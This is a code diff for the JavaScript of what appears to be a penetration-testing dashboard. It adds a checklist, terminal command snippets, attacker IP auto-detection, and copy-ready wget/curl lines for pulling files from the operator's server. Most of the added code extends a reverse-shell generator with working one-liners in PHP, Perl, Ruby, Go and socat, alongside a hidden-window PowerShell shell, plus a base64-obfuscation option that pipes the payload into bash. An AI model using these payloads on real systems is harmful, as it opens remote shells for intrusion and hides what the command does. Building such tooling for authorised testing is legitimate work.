@@ -40,7 +40,10 @@ document.addEventListener('DOMContentLoaded', () => {
                     localStorage.setItem('currentWorkspaceId', currentWorkspaceId);
                 }
 
-                if (currentWorkspaceId) loadNotes();
+                if (currentWorkspaceId) {
+                    loadNotes();
+                    loadChecklist();
+                }
             });
     }
 
@@ -48,6 +51,7 @@ document.addEventListener('DOMContentLoaded', () => {
         currentWorkspaceId = e.target.value;
         localStorage.setItem('currentWorkspaceId', currentWorkspaceId);
         loadNotes();
+        loadChecklist();
     });
 
     document.getElementById('btn-create-workspace').addEventListener('click', () => {
@@ -127,12 +131,178 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     });
 
+    // --- Checklist Logic ---
+    function loadChecklist() {
+        if (!currentWorkspaceId) return;
+        fetch(`/api/workspaces/${currentWorkspaceId}/checklist`)
+            .then(r => r.json())
+            .then(items => {
+                const container = document.getElementById('checklist-container');
+                container.innerHTML = '';
+                items.forEach(item => {
+                    const div = document.createElement('div');
+                    div.className = 'form-check d-flex align-items-center mb-1';
+
+                    const check = document.createElement('input');
+                    check.className = 'form-check-input bg-dark border-secondary me-2';
+                    check.type = 'checkbox';
+                    check.checked = item.completed;
+                    check.id = `checklist-item-${item.id}`;
+                    check.onchange = () => toggleChecklistItem(item.id, check.checked);
+
+                    const label = document.createElement('label');
+                    label.className = 'form-check-label text-light small flex-grow-1 ' + (item.completed ? 'text-decoration-line-through text-muted' : '');
+                    label.htmlFor = `checklist-item-${item.id}`;
+                    label.innerText = item.name;
+
+                    const delBtn = document.createElement('i');
+                    delBtn.className = 'bi bi-trash text-danger ms-2';
+                    delBtn.style.cursor = 'pointer';
+                    delBtn.style.fontSize = '0.8rem';
+                    delBtn.onclick = () => deleteChecklistItem(item.id);
+
+                    div.appendChild(check);
+                    div.appendChild(label);
+                    div.appendChild(delBtn);
+                    container.appendChild(div);
+                });
+            });
+    }
+
+    function toggleChecklistItem(id, completed) {
+        fetch(`/api/checklist/${id}`, {
+            method: 'PUT',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({completed: completed})
+        }).then(() => loadChecklist());
+    }
+
+    function deleteChecklistItem(id) {
+        if(confirm('Delete this item?')) {
+            fetch(`/api/checklist/${id}`, { method: 'DELETE' }).then(() => loadChecklist());
+        }
+    }
+
+    document.getElementById('btn-add-checklist').addEventListener('click', () => {
+        const input = document.getElementById('new-checklist-item');
+        const name = input.value;
+        if (name && currentWorkspaceId) {
+             fetch(`/api/workspaces/${currentWorkspaceId}/checklist`, {
+                 method: 'POST',
+                 headers: {'Content-Type': 'application/json'},
+                 body: JSON.stringify({name: name})
+             }).then(() => {
+                 input.value = '';
+                 loadChecklist();
+             });
+        }
+    });
+
+    document.getElementById('btn-refresh-checklist').addEventListener('click', loadChecklist);
+    // Auto refresh checklist when tab shown
+    document.getElementById('tab-btn-checklist').addEventListener('shown.bs.tab', loadChecklist);
+
+
+    // --- Snippets Logic ---
+    function loadSnippets() {
+        fetch('/api/snippets')
+            .then(r => r.json())
+            .then(snippets => {
+                const list = document.getElementById('snippets-list');
+                list.innerHTML = '';
+                snippets.forEach(s => {
+                    const btn = document.createElement('button');
+                    btn.className = 'list-group-item list-group-item-action bg-dark text-light small py-1 d-flex justify-content-between align-items-center snippet-btn';
+
+                    const span = document.createElement('span');
+                    span.innerText = s.name;
+                    span.style.overflow = 'hidden';
+                    span.style.textOverflow = 'ellipsis';
+
+                    // The whole button click triggers the command
+                    // But we have a delete button inside.
+
+                    const del = document.createElement('i');
+                    del.className = 'bi bi-trash text-secondary';
+                    del.style.fontSize = '0.7rem';
+                    del.onclick = (e) => {
+                        e.stopPropagation();
+                        deleteSnippet(s.id);
+                    }
+
+                    btn.appendChild(span);
+                    btn.appendChild(del);
+
+                    btn.onclick = () => runSnippet(s.command);
+
+                    list.appendChild(btn);
+                });
+            });
+    }
+
+    function runSnippet(cmd) {
+        const vars = getVars();
+        // Replace variables
+        cmd = cmd.replace(/{RHOST}/g, vars.RHOST).replace(/{LHOST}/g, vars.LHOST);
+
+        if(activeTermId && terminals[activeTermId]) {
+            socket.emit('input', { term_id: activeTermId, input: cmd + "\n" });
+        } else {
+            alert('No active terminal');
+        }
+    }
+
+    function deleteSnippet(id) {
+        if(confirm('Delete snippet?')) {
+            fetch(`/api/snippets/${id}`, { method: 'DELETE' }).then(() => loadSnippets());
+        }
+    }
+
+    document.getElementById('btn-save-snippet').addEventListener('click', () => {
+        const name = document.getElementById('new-snippet-name').value;
+        const cmd = document.getElementById('new-snippet-cmd').value;
+        if(name && cmd) {
+            fetch('/api/snippets', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({name: name, command: cmd})
+            }).then(() => {
+                document.getElementById('new-snippet-name').value = '';
+                document.getElementById('new-snippet-cmd').value = '';
+                loadSnippets();
+                // Collapse the form
+                new bootstrap.Collapse(document.getElementById('addSnippetForm'), {toggle: true}).hide();
+            });
+        }
+    });
+
     // --- Helpers ---
     function getVars() {
         return {
             RHOST: document.getElementById('var-rhost').value || '127.0.0.1',
             LHOST: document.getElementById('var-lhost').value || '127.0.0.1'
         };
+    }
+
+    function autoDetectLHOST() {
+        fetch('/api/network/interfaces')
+            .then(r => r.json())
+            .then(data => {
+                const ifaces = data.interfaces;
+                if (ifaces.length > 0) {
+                    // Priority: tun0, then tap0, then eth0, then first non-loopback
+                    let target = ifaces.find(i => i.name === 'tun0');
+                    if (!target) target = ifaces.find(i => i.name === 'tap0');
+                    if (!target) target = ifaces.find(i => i.name === 'eth0');
+                    if (!target) target = ifaces.find(i => i.name !== 'lo');
+
+                    if (target) {
+                        document.getElementById('var-lhost').value = target.ip;
+                        // Also trigger update of revshell
+                        updateRevShell();
+                    }
+                }
+            });
     }
 
     function checkVpnStatus() {
@@ -194,23 +364,44 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // --- File Manager ---
     function loadFiles() {
-        fetch('/api/files')
+        // We need http port for helper buttons
+        fetch('/api/tools/http/status')
         .then(r => r.json())
-        .then(files => {
-            const tbody = document.getElementById('file-list-body');
-            tbody.innerHTML = '';
-            files.forEach(f => {
-                const tr = document.createElement('tr');
-                tr.innerHTML = `
-                    <td class="text-truncate" style="max-width: 150px;" title="${f.name}">${f.name}</td>
-                    <td>${(f.size / 1024).toFixed(1)} KB</td>
-                    <td class="text-end">
-                        <button class="btn btn-sm btn-outline-danger py-0" style="font-size: 0.65rem;" onclick="deleteFile('${f.name}')">Del</button>
-                    </td>
-                `;
-                tbody.appendChild(tr);
+        .then(httpStatus => {
+            const httpPort = httpStatus.running ? httpStatus.port : (document.getElementById('http-port').value || 8000);
+
+            fetch('/api/files')
+            .then(r => r.json())
+            .then(files => {
+                const tbody = document.getElementById('file-list-body');
+                tbody.innerHTML = '';
+                const vars = getVars();
+
+                files.forEach(f => {
+                    const tr = document.createElement('tr');
+
+                    const wgetCmd = `wget http://${vars.LHOST}:${httpPort}/${f.name}`;
+                    const curlCmd = `curl http://${vars.LHOST}:${httpPort}/${f.name} -o ${f.name}`;
+
+                    tr.innerHTML = `
+                        <td class="text-truncate" style="max-width: 150px;" title="${f.name}">${f.name}</td>
+                        <td>${(f.size / 1024).toFixed(1)} KB</td>
+                        <td class="text-end">
+                            <button class="btn btn-sm btn-outline-info py-0 me-1" style="font-size: 0.65rem;" title="Copy Wget" onclick="copyToClipboard('${wgetCmd}')">Wget</button>
+                            <button class="btn btn-sm btn-outline-info py-0 me-1" style="font-size: 0.65rem;" title="Copy Curl" onclick="copyToClipboard('${curlCmd}')">Curl</button>
+                            <button class="btn btn-sm btn-outline-danger py-0" style="font-size: 0.65rem;" onclick="deleteFile('${f.name}')">Del</button>
+                        </td>
+                    `;
+                    tbody.appendChild(tr);
+                });
             });
         });
+    }
+
+    window.copyToClipboard = function(text) {
+        navigator.clipboard.writeText(text);
+        // Maybe show toast? For now just silent or console
+        console.log("Copied:", text);
     }
 
     window.deleteFile = function(filename) {
@@ -445,6 +636,8 @@ document.addEventListener('DOMContentLoaded', () => {
         }
 
         loadWorkspaces();
+        loadSnippets(); // Load snippets on connect
+        autoDetectLHOST(); // Auto Detect IP
 
         if (Object.keys(terminals).length === 0) {
             createTerminal('default');
@@ -640,24 +833,10 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     });
 
-    // Snippets
-    document.querySelectorAll('.snippet-btn').forEach(btn => {
-        btn.addEventListener('click', () => {
-            let cmd = btn.dataset.cmd;
-            const vars = getVars();
-            cmd = cmd.replace(/{RHOST}/g, vars.RHOST).replace(/{LHOST}/g, vars.LHOST);
-
-            if(activeTermId && terminals[activeTermId]) {
-                socket.emit('input', { term_id: activeTermId, input: cmd + "\n" });
-            } else {
-                alert('No active terminal');
-            }
-        });
-    });
-
     // RevShell Generator
     function updateRevShell() {
         const type = document.getElementById('revshell-type').value;
+        const base64 = document.getElementById('revshell-base64').checked;
         const vars = getVars();
         const port = 4444; // Default or could use input
         let shell = '';
@@ -675,11 +854,33 @@ document.addEventListener('DOMContentLoaded', () => {
             case 'powershell':
                 shell = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${vars.LHOST}",${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
                 break;
+            case 'php':
+                shell = `php -r '$sock=fsockopen("${vars.LHOST}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`;
+                break;
+            case 'perl':
+                shell = `perl -e 'use Socket;$i="${vars.LHOST}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`;
+                break;
+            case 'ruby':
+                shell = `ruby -rsocket -e'f=TCPSocket.open("${vars.LHOST}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`;
+                break;
+            case 'golang':
+                shell = `echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","${vars.LHOST}:${port}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go`;
+                break;
+            case 'socat':
+                shell = `socat TCP4:${vars.LHOST}:${port} EXEC:/bin/bash`;
+                break;
         }
+
+        if (base64) {
+             shell = `echo ${btoa(shell)} | base64 -d | bash`;
+        }
+
         document.getElementById('revshell-output').value = shell;
     }
 
     document.getElementById('revshell-type').addEventListener('change', updateRevShell);
+    document.getElementById('revshell-base64').addEventListener('change', updateRevShell);
+
     ['var-rhost', 'var-lhost'].forEach(id => {
         document.getElementById(id).addEventListener('input', updateRevShell);
     });
